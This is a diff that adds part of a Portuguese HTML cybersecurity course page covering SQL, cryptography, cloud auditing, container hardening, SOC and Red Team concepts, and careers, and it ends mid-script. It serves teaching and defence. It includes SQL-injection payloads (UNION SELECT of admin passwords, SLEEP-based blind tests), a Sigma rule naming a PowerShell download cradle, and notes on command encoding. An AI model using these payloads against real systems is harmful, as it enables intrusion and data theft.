+                        porta_orig, porta_dest, seq, ack, urg, ack_flag, psh, rst, syn, fin, dados = self.analisar_tcp(dados)
+                        print(f"[TCP] {origem}:{porta_orig} -&gt; {destino}:{porta_dest} | SYN={syn} ACK={ack_flag} FIN={fin}")
+        except KeyboardInterrupt:
+            print("\nSniffer encerrado.")
+
+if __name__ == "__main__":
+    sniffer = PacketSniffer()
+    sniffer.capturar()</code></pre>
+      </div>
+    
+      <div class="card quiz-card">
+        <h3>🎯 Checkpoint — Teste seus conhecimentos</h3>
+        <div class="quiz-container" data-quiz-mod="10"></div>
+      </div>
+    </section>
+
+    <!-- MÓDULO 11 -->
+    <section class="section" id="mod11" data-mod="11">
+      <div class="section-header">
+        <h2>Modulo 11 — Banco de Dados &amp; SQL</h2>
+        <span class="section-tag">Intermediario</span>
+        <span class="est-time">~50 min</span>
+        <div class="section-progress">
+          <button class="mark-complete-btn" data-mod="11">Marcar concluído</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>11.1 Comandos SQL Essenciais</h3>
+        <pre data-lang="sql"><code class="language-sql">-- CRIAR BANCO E TABELA
+CREATE DATABASE seguranca_db;
+USE seguranca_db;
+
+CREATE TABLE usuarios (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    nome VARCHAR(100) NOT NULL,
+    email VARCHAR(100) UNIQUE NOT NULL,
+    senha_hash VARCHAR(255) NOT NULL,
+    perfil ENUM('admin', 'analista', 'user') DEFAULT 'user',
+    criado_em TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+);
+
+-- INSERIR DADOS
+INSERT INTO usuarios (nome, email, senha_hash, perfil)
+VALUES ('Ana Silva', 'ana@empresa.com', 'hash_aqui', 'admin');
+
+-- CONSULTAR
+SELECT * FROM usuarios WHERE perfil = 'admin';
+SELECT nome, email FROM usuarios ORDER BY criado_em DESC LIMIT 10;
+
+-- ATUALIZAR
+UPDATE usuarios SET perfil = 'analista' WHERE id = 2;
+
+-- DELETAR
+DELETE FROM usuarios WHERE id = 5;
+
+-- JOINS
+SELECT u.nome, l.ip_acesso, l.data_hora
+FROM usuarios u
+INNER JOIN logs_acesso l ON u.id = l.usuario_id
+WHERE l.data_hora >= DATE_SUB(NOW(), INTERVAL 7 DAY);
+
+-- INDICES (performance e seguranca)
+CREATE INDEX idx_email ON usuarios(email);
+CREATE INDEX idx_data ON logs_acesso(data_hora);
+
+-- VIEWS (abstracao de dados sensiveis)
+CREATE VIEW usuarios_publicos AS
+SELECT id, nome, perfil, criado_em FROM usuarios;  -- sem email e senha!</code></pre>
+        <p><strong>Backup e restore:</strong></p>
+        <pre data-lang="bash"><code class="language-bash"># MySQL:
+mysqldump -u root -p seguranca_db &gt; backup.sql
+mysql -u root -p seguranca_db &lt; backup.sql
+
+# PostgreSQL:
+pg_dump -U postgres seguranca_db &gt; backup.sql
+psql -U postgres seguranca_db &lt; backup.sql</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>11.2 SQL Injection Avancado &amp; Defesa</h3>
+        <p><strong>Tecnicas de Injecao (para entender a defesa):</strong></p>
+        <ul class="content-list">
+          <li><strong>Union-based:</strong> <code>UNION SELECT username, password FROM admins--</code></li>
+          <li><strong>Error-based:</strong> forcar erros para extrair informacoes do schema</li>
+          <li><strong>Blind Boolean:</strong> <code>AND 1=1</code> vs <code>AND 1=2</code> para inferir dados</li>
+          <li><strong>Time-based:</strong> <code>AND SLEEP(5)</code> para confirmar injecao quando nao ha output visivel</li>
+        </ul>
+        <p><strong>Defesa em Profundidade:</strong></p>
+        <pre data-lang="python"><code class="language-python"># 1. Prepared Statements (PRIMARIA)
+cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
+
+# 2. ORM seguro (SQLAlchemy, Django ORM)
+User.objects.filter(username=input_user).first()
+
+# 3. Whitelist de caracteres permitidos
+import re
+if not re.match(r'^[a-zA-Z0-9_]+$', user_input):
+    raise ValueError("Input invalido")</code></pre>
+        <pre data-lang="sql"><code class="language-sql">-- 4. Principio do menor privilegio no DB
+-- Criar usuario de app apenas com permissoes necessarias
+CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'senha_forte';
+GRANT SELECT, INSERT, UPDATE ON seguranca_db.* TO 'app_user'@'localhost';
+REVOKE DELETE, DROP ON seguranca_db.* FROM 'app_user'@'localhost';</code></pre>
+      </div>
+    
+      <div class="card quiz-card">
+        <h3>🎯 Checkpoint — Teste seus conhecimentos</h3>
+        <div class="quiz-container" data-quiz-mod="11"></div>
+      </div>
+    </section>
+
+    <!-- MÓDULO 12 -->
+    <section class="section" id="mod12" data-mod="12">
+      <div class="section-header">
+        <h2>Modulo 12 — Criptografia Aplicada</h2>
+        <span class="section-tag danger">Intermediario -> Avancado</span>
+        <span class="est-time">~45 min</span>
+        <div class="section-progress">
+          <button class="mark-complete-btn" data-mod="12">Marcar concluído</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>12.1 Conceitos Fundamentais</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Conceito</th><th>Descricao</th><th>Uso</th></tr></thead>
+            <tbody>
+              <tr><td>Hash</td><td>Funcao unidirecional (nao reversivel)</td><td>Armazenar senhas, verificar integridade</td></tr>
+              <tr><td>Criptografia Simetrica</td><td>Mesma chave para criptografar e descriptografar</td><td>AES, ChaCha20 — dados em repouso</td></tr>
+              <tr><td>Criptografia Assimetrica</td><td>Par de chaves (publica/privada)</td><td>RSA, ECC — TLS, assinaturas digitais</td></tr>
+              <tr><td>Assinatura Digital</td><td>Prova de autenticidade e nao-repudio</td><td>Documentos, certificados</td></tr>
+              <tr><td>PKI</td><td>Infraestrutura de Chaves Publicas</td><td>Certificados SSL/TLS</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>12.2 Algoritmos e Protocolos</h3>
+        <pre data-lang="plain"><code>Hashing:
+  MD5     -> 128 bits (QUEBRADO, nao use para seguranca)
+  SHA-1   -> 160 bits (DEPRECADO)
+  SHA-256 -> 256 bits (padrao atual)
+  SHA-3   -> Familia Keccak (futuro)
+  bcrypt  -> Para senhas (adaptativo, lento por design)
+  Argon2  -> Vencedor do Password Hashing Competition
+
+Criptografia Simetrica:
+  AES-128/256 -> Padrao mundial (modos: GCM, CBC, CTR)
+  ChaCha20    -> Alternativa moderna, resistente a timing attacks
+
+Criptografia Assimetrica:
+  RSA-2048/4096 -> Fatoracao de primos
+  ECC (P-256)   -> Curvas elipticas, chaves menores, mesmo nivel de seguranca
+  Diffie-Hellman -> Troca segura de chaves em canal inseguro
+
+Protocolos:
+  TLS 1.3 -> Sucessor do SSL, protege HTTPS
+  IPsec   -> VPNs site-to-site
+  SSH     -> Acesso remoto criptografado
+  PGP/GPG -> E-mail e arquivos</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>12.3 TLS/SSL na Pratica</h3>
+        <pre data-lang="bash"><code class="language-bash"># Verificar certificado de um site
+openssl s_client -connect google.com:443 -servername google.com
+
+# Gerar chave privada e CSR (Certificate Signing Request)
+openssl genrsa -out server.key 2048
+openssl req -new -key server.key -out server.csr -subj "/C=BR/ST=SP/L=Sao Paulo/O=Empresa/CN=site.com"
+
+# Gerar certificado auto-assinado (apenas para testes!)
+openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt
+
+# Verificar configuracao TLS do servidor
+nmap --script ssl-enum-ciphers -p 443 site.com</code></pre>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Comando</th><th>O que faz</th></tr></thead>
+            <tbody>
+              <tr><td><code>openssl s_client -connect &lt;host&gt;:443 -servername &lt;host&gt;</code></td><td>Abre uma conexão TLS manual com o servidor e exibe o certificado apresentado, a cadeia de confiança e os detalhes do handshake; <code>-servername</code> envia o SNI (necessário quando um IP hospeda vários domínios)</td></tr>
+              <tr><td><code>openssl genrsa -out server.key 2048</code></td><td>Gera uma chave privada RSA de 2048 bits e salva no arquivo <code>server.key</code> — a base de qualquer certificado</td></tr>
+              <tr><td><code>openssl req -new -key server.key -out server.csr -subj "..."</code></td><td>Cria uma CSR (Certificate Signing Request) a partir da chave privada; a CSR é o que você envia a uma autoridade certificadora (CA) para obter um certificado assinado; <code>-subj</code> preenche os dados da organização sem prompt interativo</td></tr>
+              <tr><td><code>openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt</code></td><td>Gera um certificado auto-assinado válido por 365 dias a partir da CSR — útil apenas para testes locais, pois navegadores não confiam nele por padrão</td></tr>
+              <tr><td><code>nmap --script ssl-enum-ciphers -p 443 &lt;host&gt;</code></td><td>Lista todas as cifras (algoritmos de criptografia) que o servidor aceita na porta 443, sinalizando quais são fracas/obsoletas e devem ser desativadas</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    
+      <div class="card quiz-card">
+        <h3>🎯 Checkpoint — Teste seus conhecimentos</h3>
+        <div class="quiz-container" data-quiz-mod="12"></div>
+      </div>
+    </section>
+
+    <!-- MÓDULO 13 -->
+    <section class="section" id="mod13" data-mod="13">
+      <div class="section-header">
+        <h2>Módulo 13 — Cloud Security</h2>
+        <span class="section-tag danger">Avançado</span>
+        <span class="est-time">~45 min</span>
+        <div class="section-progress">
+          <button class="mark-complete-btn" data-mod="13">Marcar concluído</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>13.1 Modelos de Serviço Cloud</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Modelo</th><th>Exemplos</th><th>Responsabilidade do Cliente</th></tr></thead>
+            <tbody>
+              <tr><td>IaaS</td><td>AWS EC2, Azure VMs, GCP Compute</td><td>SO, apps, dados, configurações de rede</td></tr>
+              <tr><td>PaaS</td><td>AWS Elastic Beanstalk, Heroku, Cloud Run</td><td>Aplicação e dados</td></tr>
+              <tr><td>SaaS</td><td>Office 365, Google Workspace, Salesforce</td><td>Dados e acesso dos usuários</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="alert gold">Modelo de Responsabilidade Compartilhada: A cloud protege a infraestrutura; VOCÊ protege seus dados, identidades e configurações.</div>
+      </div>
+
+      <div class="card">
+        <h3>13.2 Segurança em AWS (exemplos aplicáveis a Azure/GCP)</h3>
+        <pre data-lang="bash"><code class="language-bash"># AWS CLI — Auditoria de segurança básica
+
+# Listar buckets S3 públicos
+aws s3api list-buckets
+aws s3api get-public-access-block --bucket nome-do-bucket
+
+# Revisar grupos de segurança (firewalls) com porta 22 aberta para 0.0.0.0/0
+aws ec2 describe-security-groups --filters Name=ip-permission.from-port,Values=22
+
+# Listar usuários IAM sem MFA
+aws iam list-users
+aws iam list-mfa-devices --user-name usuario
+
+# Revisar políticas IAM com permissões administrativas
+aws iam list-attached-user-policies --user-name usuario
+
+# CloudTrail — logs de API
+aws cloudtrail describe-trails
+aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=PutBucketPolicy</code></pre>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Comando</th><th>O que faz</th></tr></thead>
+            <tbody>
+              <tr><td><code>aws s3api list-buckets</code></td><td>Lista todos os buckets S3 da conta — o primeiro passo para depois checar quais estão configurados como públicos por engano</td></tr>
+              <tr><td><code>aws s3api get-public-access-block --bucket &lt;nome&gt;</code></td><td>Mostra as configurações de bloqueio de acesso público daquele bucket específico; se vier vazio/erro, o bucket pode não ter proteção nenhuma configurada</td></tr>
+              <tr><td><code>aws ec2 describe-security-groups --filters ...</code></td><td>Filtra os Security Groups (firewalls da AWS) que liberam a porta especificada — combinado com um filtro de origem <code>0.0.0.0/0</code> identifica portas administrativas abertas para a internet inteira</td></tr>
+              <tr><td><code>aws iam list-users</code></td><td>Lista todos os usuários IAM (contas de acesso) cadastrados na conta</td></tr>
+              <tr><td><code>aws iam list-mfa-devices --user-name &lt;user&gt;</code></td><td>Mostra se o usuário tem um dispositivo MFA (autenticação em dois fatores) registrado — resposta vazia = usuário sem MFA, um risco de segurança</td></tr>
+              <tr><td><code>aws iam list-attached-user-policies --user-name &lt;user&gt;</code></td><td>Lista as políticas de permissão anexadas ao usuário, para auditar se ele tem privilégios administrativos além do necessário (violação do princípio do menor privilégio)</td></tr>
+              <tr><td><code>aws cloudtrail describe-trails</code></td><td>Lista as "trilhas" de auditoria configuradas — o CloudTrail registra cada chamada de API feita na conta</td></tr>
+              <tr><td><code>aws cloudtrail lookup-events --lookup-attributes ...</code></td><td>Busca eventos específicos no histórico do CloudTrail; o exemplo procura toda vez que a política de um bucket S3 foi alterada, útil para investigar uma mudança suspeita de permissões</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>13.3 Container Security (Docker &amp; Kubernetes)</h3>
+        <pre data-lang="dockerfile"><code class="language-dockerfile"># Dockerfile SEGURO — boas práticas
+FROM python:3.11-slim  # Use imagens oficiais e mínimas
+
+# Não rode como root
+RUN groupadd -r appgroup &amp;&amp; useradd -r -g appgroup appuser
+WORKDIR /app
+COPY requirements.txt .
+RUN pip install --no-cache-dir -r requirements.txt
+COPY . .
+USER appuser
+
+EXPOSE 8080
+CMD ["python", "app.py"]</code></pre>
+        <pre data-lang="yaml"><code class="language-yaml"># Kubernetes — Security Context
+apiVersion: v1
+kind: Pod
+metadata:
+  name: app-segura
+spec:
+  securityContext:
+    runAsNonRoot: true
+    runAsUser: 1000
+    fsGroup: 2000
+  containers:
+  - name: app
+    image: minha-app:1.0
+    securityContext:
+      allowPrivilegeEscalation: false
+      readOnlyRootFilesystem: true
+      capabilities:
+        drop:
+          - ALL</code></pre>
+      </div>
+    
+      <div class="card quiz-card">
+        <h3>🎯 Checkpoint — Teste seus conhecimentos</h3>
+        <div class="quiz-container" data-quiz-mod="13"></div>
+      </div>
+    </section>
+
+    <!-- MÓDULO 14 -->
+    <section class="section" id="mod14" data-mod="14">
+      <div class="section-header">
+        <h2>Módulo 14 — Blue Team &amp; SOC</h2>
+        <span class="section-tag danger">Avançado</span>
+        <span class="est-time">~40 min</span>
+        <div class="section-progress">
+          <button class="mark-complete-btn" data-mod="14">Marcar concluído</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>14.1 Funções do Blue Team</h3>
+        <ul class="content-list">
+          <li>Monitoramento contínuo de redes, endpoints e logs</li>
+          <li>Detecção de intrusões (IDS/IPS)</li>
+          <li>Resposta a incidentes (contenção, erradicação, recuperação)</li>
+          <li>Análise forense digital</li>
+          <li>Threat Intelligence (inteligência contra ameaças)</li>
+          <li>Hardening e remediação de vulnerabilidades</li>
+        </ul>
+      </div>
+
+      <div class="card">
+        <h3>14.2 SIEM — Security Information and Event Management</h3>
+        <p>Ferramentas populares: Splunk, Elastic Stack (ELK), QRadar, Sentinel, Wazuh</p>
+        <p><strong>Logs essenciais para correlacionar:</strong></p>
+        <pre data-lang="plain"><code>- Firewall (conexões bloqueadas/permitidas)
+- IDS/IPS (alertas de assinaturas)
+- Windows Event Log (Event IDs: 4625=falha login, 4688=novo processo)
+- Sysmon (Event ID 1=process creation, 3=network connection, 10=process access)
+- Proxy/Web (URLs acessadas, downloads)
+- DNS (resoluções de nomes suspeitas)
+- DHCP (atribuições de IP)</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>14.3 Detecção com Sigma Rules (exemplo)</h3>
+        <pre data-lang="yaml"><code class="language-yaml">title: PowerShell Download Cradle Detected
+logsource:
+    product: windows
+    service: powershell
+detection:
+    selection:
+        EventID: 4104
+        ScriptBlockText|contains:
+            - 'IEX(New-Object Net.WebClient).downloadString'
+            - 'Invoke-Expression'
+    condition: selection
+level: high</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>14.4 MITRE ATT&amp;CK Framework</h3>
+        <p>Framework de táticas e técnicas usadas por adversários:</p>
+        <ul class="content-list">
+          <li><strong>Táticas:</strong> Initial Access, Execution, Persistence, Privilege Escalation, etc.</li>
+          <li><strong>Técnicas:</strong> T1566 (Phishing), T1059 (Command and Scripting Interpreter), etc.</li>
+        </ul>
+        <div class="alert">Uso: Mapear detecções, identificar gaps de cobertura e priorizar defesas.</div>
+      </div>
+    
+      <div class="card quiz-card">
+        <h3>🎯 Checkpoint — Teste seus conhecimentos</h3>
+        <div class="quiz-container" data-quiz-mod="14"></div>
+      </div>
+    </section>
+
+    <!-- MÓDULO 15 -->
+    <section class="section" id="mod15" data-mod="15">
+      <div class="section-header">
+        <h2>Módulo 15 — Red Team Avançado</h2>
+        <span class="section-tag danger">Avançado</span>
+        <span class="est-time">~40 min</span>
+        <div class="section-progress">
+          <button class="mark-complete-btn" data-mod="15">Marcar concluído</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>15.1 Diferença Pentest vs Red Team</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th></th><th>Pentest</th><th>Red Team</th></tr></thead>
+            <tbody>
+              <tr><td>Escopo</td><td>Definido, limitado</td><td>Amplo, organização inteira</td></tr>
+              <tr><td>Tempo</td><td>Dias/semanas</td><td>Meses</td></tr>
+              <tr><td>Objetivo</td><td>Encontrar vulns técnicas</td><td>Testar detecção e resposta da organização</td></tr>
+              <tr><td>Aviso</td><td>Geralmente conhecido</td><td>Stealth, poucos sabem</td></tr>
+              <tr><td>Foco</td><td>Exploração técnica</td><td>Simulação de adversário real</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>15.2 Técnicas de Evasão (conceitos, para fins de detecção defensiva)</h3>
+        <pre data-lang="powershell"><code class="language-powershell"># Estes exemplos ilustram por que Defenders monitoram
+# ofuscacao e encoding — use para reconhecer e detectar, nao para atacar sistemas sem autorizacao.
+
+# Encoding de comandos (o que um SOC deve saber identificar em logs)
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("whoami"))
+# powershell -enc <base64> costuma ser sinalizado por EDRs modernos
+
+# Living Off The Land (LOLBins) — binarios legitimos usados de forma maliciosa
+# Defensores devem monitorar uso anomalo de: certutil, bitsadmin, mshta, regsvr32</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>15.3 C2 (Command and Control) — Conceitos</h3>
+        <ul class="content-list">
+          <li><strong>Beaconing:</strong> Comunicação periódica da vítima com servidor de atacante</li>
+          <li><strong>Domain Fronting:</strong> Usar CDN de empresas legítimas para ocultar C2</li>
+          <li><strong>DNS Tunneling:</strong> Exfiltrar dados via queries DNS</li>
+          <li><strong>HTTPS C2:</strong> Tráfego criptografado que se mistura com tráfego legítimo</li>
+        </ul>
+      </div>
+    
+      <div class="card quiz-card">
+        <h3>🎯 Checkpoint — Teste seus conhecimentos</h3>
+        <div class="quiz-container" data-quiz-mod="15"></div>
+      </div>
+    </section>
+
+    <!-- MÓDULO 16 -->
+    <section class="section" id="mod16" data-mod="16">
+      <div class="section-header">
+        <h2>Módulo 16 — Projetos Completos (Checklist Profissional)</h2>
+        <span class="section-tag gold">Profissional</span>
+        <span class="est-time">~15 min</span>
+        <div class="section-progress">
+          <button class="mark-complete-btn" data-mod="16">Marcar concluído</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>15 Projetos de Consolidação</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>#</th><th>Projeto</th><th>Tecnologias</th><th>Conceitos</th></tr></thead>
+            <tbody>
+              <tr><td>1</td><td>Scanner de Portas</td><td>Python, sockets, threads</td><td>Redes, TCP/IP, concorrência</td></tr>
+              <tr><td>2</td><td>Password Manager</td><td>Python, Fernet, PBKDF2</td><td>Criptografia simétrica, KDF</td></tr>
+              <tr><td>3</td><td>Sistema de Login JWT</td><td>Python, HMAC, hashlib</td><td>Autenticação, tokens, hashes</td></tr>
+              <tr><td>4</td><td>Firewall Simples</td><td>Python, iptables, regex</td><td>Defesa perimetral, logs</td></tr>
+              <tr><td>5</td><td>Packet Sniffer</td><td>Python, raw sockets, struct</td><td>Modelo OSI, análise de pacotes</td></tr>
+              <tr><td>6</td><td>Hash Generator</td><td>Python, hashlib</td><td>Integridade, hashes unidirecionais</td></tr>
+              <tr><td>7</td><td>Analisador de Processos</td><td>Python, psutil</td><td>Monitoramento de sistema, detecção de anomalias</td></tr>
+              <tr><td>8</td><td>Criptografia RSA</td><td>Python, cryptography</td><td>Chave pública/privada, PKI</td></tr>
+              <tr><td>9</td><td>Web Scraper Seguro</td><td>Python, requests, BS4</td><td>Parsing, headers de segurança</td></tr>
+              <tr><td>10</td><td>API Security Tester</td><td>Python, requests</td><td>OWASP API Security, autenticação</td></tr>
+              <tr><td>11</td><td>Port Monitor</td><td>Python, psutil</td><td>Monitoramento de processos</td></tr>
+              <tr><td>12</td><td>Sistema SQL com Defesa</td><td>Python, SQL, prepared statements</td><td>SQL Injection, defesa em camadas</td></tr>
+              <tr><td>13</td><td>Chat Criptografado</td><td>Python, sockets, AES</td><td>Criptografia em trânsito</td></tr>
+              <tr><td>14</td><td>Monitor de Logs</td><td>Python/Bash, regex, alerting</td><td>SIEM, detecção de anomalias</td></tr>
+              <tr><td>15</td><td>Dashboard de Segurança</td><td>Python/Flask, HTML, JS</td><td>Visualização, métricas de segurança</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    
+      <div class="card quiz-card">
+        <h3>🎯 Checkpoint — Teste seus conhecimentos</h3>
+        <div class="quiz-container" data-quiz-mod="16"></div>
+      </div>
+    </section>
+
+    <!-- MÓDULO 17 -->
+    <section class="section" id="mod17" data-mod="17">
+      <div class="section-header">
+        <h2>Módulo 17 — Roadmap de Carreira</h2>
+        <span class="section-tag gold">Profissional</span>
+        <span class="est-time">~25 min</span>
+        <div class="section-progress">
+          <button class="mark-complete-btn" data-mod="17">Marcar concluído</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>17.1 Trilha de Estudos por Nível</h3>
+        <pre data-lang="plain"><code>INICIANTE (0-6 meses)
+├── Redes (TCP/IP, DNS, HTTP, portas)
+├── Linux (comandos, bash, permissões)
+├── Hardware básico (CPU, RAM, storage)
+├── Python (lógica, scripts, sockets)
+├── SQL (CRUD, joins, procedures)
+├── HTML/CSS/JS (fundamentos web)
+└── Segurança da Informação (CIA, LGPD, ameaças)
+
+INTERMEDIÁRIO (6-12 meses)
+├── JavaScript (DOM, fetch, cookies, JWT)
+├── APIs REST (consumo, autenticação)
+├── OWASP Top 10 (cada vulnerabilidade na prática)
+├── Wireshark (filtros, análise de tráfego)
+├── Criptografia (AES, RSA, hashes, TLS)
+├── Cloud básico (AWS/Azure/GCP — IAM, S3, EC2)
+├── Docker (containers, Dockerfile, compose)
+└── Pentest básico (Nmap, Nikto, Burp, Metasploit)
+
+AVANÇADO (12-24 meses)
+├── Ethical Hacking (metodologia, relatórios)
+├── Kali Linux (toolkit completo)
+├── Pentest Web avançado (XSS, SQLi, CSRF, SSRF)
+├── Engenharia Reversa (IDA, Ghidra — básico)
+├── Blue Team (SIEM, logs, Sigma, MITRE ATT&amp;CK)
+├── Red Team (evasão, C2, pivoting)
+├── Cloud Security (IAM, WAF, SIEM em cloud)
+├── DevSecOps (CI/CD security, SAST/DAST)
+└── Forense Digital (imagem de disco, análise de memória)
+
+PROFISSIONAL (24+ meses)
+├── Certificações: CompTIA Security+, CEH, OSCP, CISSP
+├── Especialização: Cloud Security, AppSec, SOC, GRC
+├── Gestão: CISO, Security Architect
+└── Pesquisa: Bug Bounty, Security Researcher</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>17.2 Certificações Recomendadas</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Certificação</th><th>Nível</th><th>Foco</th></tr></thead>
+            <tbody>
+              <tr><td>CompTIA Security+</td><td>Iniciante</td><td>Fundamentos amplos</td></tr>
+              <tr><td>CompTIA CySA+</td><td>Intermediário</td><td>Análise de ameaças (Blue Team)</td></tr>
+              <tr><td>CEH (Certified Ethical Hacker)</td><td>Intermediário</td><td>Metodologia de pentest</td></tr>
+              <tr><td>eJPT (eLearnSecurity)</td><td>Intermediário</td><td>Pentest prático</td></tr>
+              <tr><td>OSCP</td><td>Avançado</td><td>Pentest técnico, hands-on</td></tr>
+              <tr><td>CISSP</td><td>Avançado</td><td>Gestão e arquitetura de segurança</td></tr>
+              <tr><td>AWS/Azure Security Specialty</td><td>Avançado</td><td>Segurança em nuvem</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>17.3 Áreas Profissionais</h3>
+        <ul class="content-list">
+          <li><strong>Ethical Hacker / Pentester:</strong> Testa segurança ofensivamente</li>
+          <li><strong>SOC Analyst:</strong> Monitora e investiga alertas de segurança</li>
+          <li><strong>Incident Responder:</strong> Reage a breaches e incidentes</li>
+          <li><strong>Forense Digital:</strong> Investiga evidências digitais</li>
+          <li><strong>Cloud Security Engineer:</strong> Protege infraestrutura cloud</li>
+          <li><strong>DevSecOps:</strong> Integra segurança no pipeline de desenvolvimento</li>
+          <li><strong>Security Engineer:</strong> Projeta e implementa controles de segurança</li>
+          <li><strong>GRC (Governança, Risco, Compliance):</strong> LGPD, ISO 27001, auditorias</li>
+          <li><strong>Threat Intelligence:</strong> Pesquisa e analisa ameaças emergentes</li>
+          <li><strong>Malware Analyst:</strong> Analisa e reverte malware</li>
+          <li><strong>CISO:</strong> Liderança estratégica da segurança da informação</li>
+        </ul>
+      </div>
+    
+      <div class="card quiz-card">
+        <h3>🎯 Checkpoint — Teste seus conhecimentos</h3>
+        <div class="quiz-container" data-quiz-mod="17"></div>
+      </div>
+    </section>
+
+    <!-- RESUMÃO FINAL -->
+    <section class="section" id="resumo">
+      <div class="section-header">
+        <h2>Resumão Final — Glossário de Operações</h2>
+        <span class="section-tag gold">Credencial de Segurança</span>
+      </div>
+
+      <div class="card">
+        <h3>Siglas e Termos Essenciais</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Sigla/Termo</th><th>Significado</th></tr></thead>
+            <tbody>
+              <tr><td>CIA</td><td>Confidencialidade, Integridade, Disponibilidade</td></tr>
+              <tr><td>LGPD</td><td>Lei Geral de Proteção de Dados</td></tr>
+              <tr><td>2FA/MFA</td><td>Autenticação em dois/multi fatores</td></tr>
+              <tr><td>VPN</td><td>Rede Privada Virtual</td></tr>
+              <tr><td>IDS/IPS</td><td>Sistema de Detecção/Prevenção de Intrusões</td></tr>
+              <tr><td>SIEM</td><td>Gestão de eventos e informações de segurança</td></tr>
+              <tr><td>SOC</td><td>Security Operations Center</td></tr>
+              <tr><td>WAF</td><td>Web Application Firewall</td></tr>
+              <tr><td>DLP</td><td>Data Loss Prevention</td></tr>
+              <tr><td>IAM</td><td>Identity and Access Management</td></tr>
+              <tr><td>SAST</td><td>Static Application Security Testing</td></tr>
+              <tr><td>DAST</td><td>Dynamic Application Security Testing</td></tr>
+              <tr><td>CVE</td><td>Common Vulnerabilities and Exposures</td></tr>
+              <tr><td>CVSS</td><td>Sistema de pontuação de vulnerabilidades</td></tr>
+              <tr><td>TTL</td><td>Time To Live (pacotes IP)</td></tr>
+              <tr><td>MTU</td><td>Maximum Transmission Unit</td></tr>
+              <tr><td>ACL</td><td>Access Control List</td></tr>
+              <tr><td>RBAC</td><td>Role-Based Access Control</td></tr>
+              <tr><td>PoC</td><td>Proof of Concept</td></tr>
+              <tr><td>RCE</td><td>Remote Code Execution</td></tr>
+              <tr><td>LFI/RFI</td><td>Local/Remote File Inclusion</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </section>
+
+    <footer>
+      <p>◈ DOOM PROTOCOL v1.0 | Sistema de Treinamento de Cibersegurança Operacional</p>
+      <p>Acesso autorizado. Distribuição controlada. Todos os protocolos monitorados.</p>
+    </footer>
+  </main>
+</div>
+
+<div class="celebration-banner" id="celebrationBanner">
+  <span class="celebration-banner-icon">🏆</span>
+  <div class="celebration-banner-text">
+    <strong>PROTOCOLO DOMINADO</strong>
+    Todos os 17 módulos concluídos. Nível de acesso: MESTRE DO PROTOCOLO.
+  </div>
+  <button class="celebration-close" id="celebrationClose" aria-label="Fechar">✕</button>
+</div>
+
+<div class="search-overlay" id="searchOverlay">
+  <div class="search-modal" role="dialog" aria-modal="true" aria-label="Buscar no site">
+    <div class="search-input-wrap">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+      <input type="text" id="searchInput" placeholder="Buscar comandos, conceitos, módulos... (ex: nmap, XSS, criptografia)" autocomplete="off">
+      <kbd>ESC</kbd>
+    </div>
+    <div class="search-results" id="searchResults">
+      <div class="search-empty">Digite para buscar em todos os 17 módulos — títulos, comandos e conceitos.</div>
+    </div>
+  </div>
+</div>
+
+<button class="back-to-top" id="backToTop" aria-label="Voltar ao topo">
+  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>
+</button>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+// ============================================
+// SYNTAX HIGHLIGHTING
+// ============================================
+if (window.hljs) {
+  hljs.highlightAll();
+}
+
+// ============================================
+// LINKS INTERNOS (ancoras) x LINKS EXTERNOS
+// ============================================
+// Em vez de um <base target="_blank"> global e fragil, tratamos cada
+// link explicitamente: ancoras internas fazem scroll suave na mesma aba,
+// links externos (http/https para fora do dominio) abrem em nova aba.
+document.addEventListener('DOMContentLoaded', function() {
+  document.querySelectorAll('a[href]').forEach(function(link) {
+    const href = link.getAttribute('href');
+    if (!href) return;
+
+    if (href.startsWith('#')) {
+      link.removeAttribute('target');
+      link.addEventListener('click', function(e) {
+        e.preventDefault();
+        const target = document.querySelector(href);
+        if (target) {
+          target.scrollIntoView({ behavior: 'smooth' });
+          history.pushState(null, null, href);
+          closeSidebar();
+        }
